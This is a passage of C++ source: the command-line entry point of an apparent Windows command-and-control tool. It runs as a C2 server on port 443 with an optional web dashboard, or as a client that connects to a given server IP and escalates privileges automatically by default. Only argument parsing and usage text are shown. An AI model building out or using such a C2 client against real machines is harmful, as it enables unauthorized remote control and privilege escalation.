            std::cout << "\nServer mode: " << argv[0] << " server [--web]" << std::endl;
            std::cout << "Client mode: " << argv[0] << " client <server_ip> [port] [--no-auto-elevate]" << std::endl;
            std::cout << "\nExamples:" << std::endl;
            std::cout << "  " << argv[0] << " server                    - Start C2 server on default port 443" << std::endl;
            std::cout << "  " << argv[0] << " server --web              - Start C2 server with web dashboard" << std::endl;
            std::cout << "  " << argv[0] << " client 192.168.1.100     - Connect to C2 server at 192.168.1.100:443" << std::endl;
            std::cout << "  " << argv[0] << " client 192.168.1.100 8443 - Connect to C2 server at 192.168.1.100:8443" << std::endl;
            std::cout << "  " << argv[0] << " client 192.168.1.100 443 --no-auto-elevate - Connect without auto privilege escalation" << std::endl;
            WSACleanup();
            return 1;
        }
        
        std::string mode = argv[1];
        std::transform(mode.begin(), mode.end(), mode.begin(), ::tolower);
        
        if (mode == "server") {
            bool startWebDashboard = false;
            
            // Check for --web parameter
            for (int i = 2; i < argc; i++) {
                std::string arg = argv[i];
                if (arg == "--web" || arg == "--server") {
                    startWebDashboard = true;
                    break;
                }
            }
            
            runServer(startWebDashboard);
        } else if (mode == "client") {
            if (argc < 3) {
                std::cerr << "Error: Client mode requires server IP address" << std::endl;
                std::cerr << "Usage: " << argv[0] << " client <server_ip> [port]" << std::endl;
                WSACleanup();
                return 1;
            }
            
            std::string serverIP = argv[2];
            int serverPort = C2_PORT; // Default port
            bool autoElevate = true;
            
            // Parse optional arguments
            for (int i = 3; i < argc; i++) {
                std::string arg = argv[i];
                if (arg == "--no-auto-elevate") {
                    autoElevate = false;
                } else {
                    // Try to parse as port number
                    try {
                        serverPort = std::stoi(arg);
                    } catch (...) {
                        std::cerr << "Warning: Unknown argument '" << arg << "'" << std::endl;
                    }
                }
            }
            
            runClient(serverIP, serverPort, autoElevate);
        } else {
            std::cerr << "Error: Unknown mode '" << mode << "'" << std::endl;
            std::cerr << "Valid modes: server, client" << std::endl;
            WSACleanup();
            return 1;
        }
        
        WSACleanup();
        return 0;
    }
